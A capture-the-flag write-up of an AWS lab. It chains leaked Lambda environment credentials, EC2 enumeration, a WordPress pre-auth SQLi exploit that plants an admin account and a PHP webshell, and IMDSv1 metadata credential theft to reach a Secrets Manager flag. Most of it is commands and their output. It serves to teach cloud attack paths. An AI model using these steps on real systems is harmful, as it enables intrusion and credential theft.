# AWS Pentest CTF Writeup

**Difficulty:** Medium
**Target:** AWS Account 342695602119 / EC2 at 3.208.88.66
**Initial Key:** `AKIAU7SR747DQCHCU****` / `wmL/Cs7pSUn+UIvf7OiDZ5CbIJm6+bCbndt5S****`
**Objective:** Retrieve the flag stored in AWS Secrets Manager using a provided low-privilege IAM key pair.

---

## Recon

### Initial Identity Check

The first command with any new set of AWS credentials is always `sts get-caller-identity`.
It confirms the credentials are valid and reveals the IAM principal without requiring any
elevated permissions.

```bash
aws sts get-caller-identity
```

Output:

```json
{
    "UserId": "AIDAU7SR747DZKCXNNLJG",
    "Account": "342695602119",
    "Arn": "arn:aws:iam::342695602119:user/cg-pentest-lab"
}
```

The user is `cg-pentest-lab`. The name suggests a deliberately low-privilege lab account.

### IAM Enumeration Attempt

Standard IAM enumeration was attempted to discover what policies were attached
to this user.

```bash
aws iam list-attached-user-policies --user-name cg-pentest-lab
aws iam list-user-policies --user-name cg-pentest-lab
aws iam list-groups-for-user --user-name cg-pentest-lab
aws iam list-users
```

All four returned `AccessDenied`. This user has no IAM read permissions.
Rather than enumerate blindly, the approach shifted to probing individual services.

---

## Credential Exposure in Lambda Environment Variables

### Discovery

Lambda functions are a common source of leaked credentials because developers
often inject secrets as environment variables for convenience. The `cg-pentest-lab`
user was tested against Lambda:

```bash
aws lambda list-functions --region us-east-1
```

This succeeded. One function was returned: `cg-log-processor-lab`. Its full configuration
was included in the response, including the `Environment` block:

```json
"Environment": {
    "Variables": {
        "LAMBDA_MANAGER_AK": "AKIAU7SR747DWVPUF****",
        "LAMBDA_MANAGER_SK": "c1ys1GMnfAt6K0zS4FXvfkeGOXu1TNwL8lqz6****"
    }
}
```

Hardcoded access key and secret were exposed in plaintext inside the function
configuration. These are long-term IAM user credentials, not temporary role credentials,
which means they remain valid until manually rotated.

### Credential Validation

The leaked credentials were configured and tested:

```bash
aws configure --profile lambda-manager
# AccessKeyId:     AKIAU7SR747DWVPUF****
# SecretAccessKey: c1ys1GMnfAt6K0zS4FXvfkeGOXu1TNwL8lqz6****
# Region:          us-east-1

aws sts get-caller-identity --profile lambda-manager
```

Output:

```json
{
    "UserId": "AIDAU7SR747DSM4QHM4OG",
    "Account": "342695602119",
    "Arn": "arn:aws:iam::342695602119:user/cg-lambda-manager-lab"
}
```

Credentials are valid. The new principal is `cg-lambda-manager-lab`.

---

## EC2 Discovery with the Lambda Manager Account

### What Worked and What Did Not

Attempts were made to enumerate IAM permissions, Lambda functions, Secrets Manager,
and SSM with this new account. All failed with `AccessDenied`.

```bash
aws iam list-users --profile lambda-manager          # AccessDenied
aws lambda list-functions --profile lambda-manager   # AccessDenied
aws secretsmanager list-secrets --profile lambda-manager # AccessDenied
aws ssm describe-instance-information --profile lambda-manager # AccessDenied
```

EC2 describe was tested and succeeded:

```bash
aws ec2 describe-instances --region us-east-1 --profile lambda-manager \
    --query 'Reservations[*].Instances[?State.Name==`running`].[InstanceId,PublicIpAddress,IamInstanceProfile,Tags]' \
    --output json
```

Output (trimmed):

```json
[
    "i-032c413f7faf2850e",
    "3.208.88.66",
    {
        "Arn": "arn:aws:iam::342695602119:instance-profile/cg-ec2-instance-profile-lab"
    },
    [{"Key": "Name", "Value": "cg-marketing-wp-lab"}]
]
```

A running EC2 instance was found at `3.208.88.66` with the name `cg-marketing-wp-lab`
and an IAM instance profile `cg-ec2-instance-profile-lab` attached. The instance
profile means the EC2 has credentials available via the metadata service.

---

## Port Scan and Web Enumeration

The instance was scanned to identify running services:

```bash
nmap -sCV 3.208.88.66
```

Output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.66 (Debian)
|_http-generator: WordPress 6.9
```

Port 80 is running WordPress 6.9. SSH is open but no credentials are known yet.

WPScan was run to enumerate the WordPress installation:

```bash
wpscan --url http://3.208.88.66/
```

Key findings:

- WordPress version 6.9 (marked insecure by WPScan)
- XML-RPC enabled at `/xmlrpc.php`
- Theme: Twenty Twenty-Five version 1.4 (outdated)
- No authentication required to reach the site

---

## WordPress RCE via Pre-Auth SQLi (wp2shell)

### Exploit

WordPress 6.9 is vulnerable to a pre-authentication SQL injection that can be chained
to create an administrator account without knowing any existing credentials. The
`wp2shell` tool automates this into an interactive shell session.

```bash
python3 wp2shell.py shell http://3.208.88.66 --interactive
```

The tool performed the following steps automatically:

1. Exploited the SQLi-to-customizer bridge to insert a new administrator account
2. Authenticated as the created admin
3. Uploaded a PHP webshell as a WordPress plugin
4. Provided an interactive prompt against the webshell

Output:

```
[+] Administrator created: wp2_92cb9d948ec1
[+]     password: Wp2!3DruVxj3k0f46EPiVK6c
[+] Webshell: http://3.208.88.66/wp-content/plugins/wp2shell_248fcb26/wp2shell_248fcb26.php
[*] Interactive shell — type commands, 'exit' or Ctrl-D to quit.

/var/www/html/wp-content/plugins/wp2shell_248fcb26 $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<img width="975" height="338" alt="image" src="https://github.com/user-attachments/assets/9ff6dc5a-4d75-4bdd-864e-f5e60be05d82" />

Code execution is confirmed as `www-data` on the EC2 instance.

---

## EC2 Metadata Credential Theft (IMDS)

### Why This Works

The EC2 instance has IMDSv1 enabled (`HttpTokens: optional` was visible in the describe
output). IMDSv1 allows any process on the instance to request credentials for the
attached IAM role by making a plain HTTP GET to `169.254.169.254`. No token or
authentication is required. Because we have code execution on the instance,
we can make that request directly.

### Getting the Role Name

The first request lists available role names attached to this instance:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Output:

```
cg-ec2-role-lab
```

<img width="975" height="227" alt="image" src="https://github.com/user-attachments/assets/850bc9e6-9835-4b89-a3c9-261ed530dda6" />


Note: the initial attempt used the profile name `cg-ec2-instance-profile-lab` from the
EC2 describe output, which returned a 404. The correct path uses the role name, not
the instance profile name. These are different objects in IAM.

### Retrieving the Credentials

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-lab
```

Output (trimmed):

```json
{
    "AccessKeyId": "ASIAU7SR747DTYU5****",
    "SecretAccessKey": "XW6VsR7ivtbW+9QUiuouttKTzIdLqYTowUMhG****",
    "Token": "IQoJb3JpZ2luX2VjEJ3...",
    "Expiration": "2026-11-12T11:24:09Z"
}
```

These are temporary credentials issued by AWS STS for the role. They include a session
token which must be provided alongside the access key and secret.

---

## Secrets Manager Access

### Configuring the Stolen Credentials

Back on the attacker machine, the three credential components were configured:

```bash
aws configure --profile ec2-role
# AccessKeyId:     ASIAU7SR747DTYU5****
# SecretAccessKey: XW6VsR7ivtbW+9QUiuouttKTzIdLqYTowUMhG****
# Region:          us-east-1

aws configure set aws_session_token "IQoJb3JpZ2luX2VjEJ3..." --profile ec2-role
```

The session token must be set separately with `configure set` because `configure`
does not prompt for it interactively.

Identity was verified before proceeding:

```bash
aws sts get-caller-identity --profile ec2-role
```

Output:

```json
{
    "UserId": "AROAU7SR747DVSKRRLWNU:i-032c413f7faf2850e",
    "Account": "342695602119",
    "Arn": "arn:aws:sts::342695602119:assumed-role/cg-ec2-role-lab/i-032c413f7faf2850e"
}
```

The session ID includes the instance ID, confirming this is a role session tied to
the EC2 instance.

### Listing and Retrieving the Secret

```bash
aws secretsmanager list-secrets --region us-east-1 --profile ec2-role
```

Output:

```json
{
    "SecretList": [
        {
            "Name": "cg-final-flag-lab",
            "Description": "CloudGoat Final Flag",
            "ARN": "arn:aws:secretsmanager:us-east-1:342695602119:secret:cg-final-flag-lab-k40D2c"
        }
    ]
}
```

<img width="975" height="479" alt="image" src="https://github.com/user-attachments/assets/22e55968-44b2-4aac-abe7-1645bbffac92" />


One secret was present. Its value was retrieved:

```bash
aws secretsmanager get-secret-value \
    --secret-id cg-final-flag-lab \
    --region us-east-1 \
    --profile ec2-role
```

Output:

```json
{
    "Name": "cg-final-flag-lab",
    "SecretString": "HSM{369817da90b44eb9aacc1ccf592d3****"
}
```

---

## Attack Chain Summary

```
cg-pentest-lab (initial creds)
  |
  | lambda:ListFunctions
  v
Lambda env vars leak cg-lambda-manager-lab credentials
  |
  | ec2:DescribeInstances
  v
Running EC2 at 3.208.88.66 with IAM role attached
  |
  | WordPress 6.9 pre-auth SQLi (wp2shell)
  v
RCE as www-data on EC2 instance
  |
  | curl http://169.254.169.254 (IMDSv1, no token required)
  v
Temporary credentials for cg-ec2-role-lab
  |
  | secretsmanager:ListSecrets + GetSecretValue
  v
Flag
```

---

## Flags

**Flag: `HSM{369817da90b44eb9aacc1ccf592d3****`**
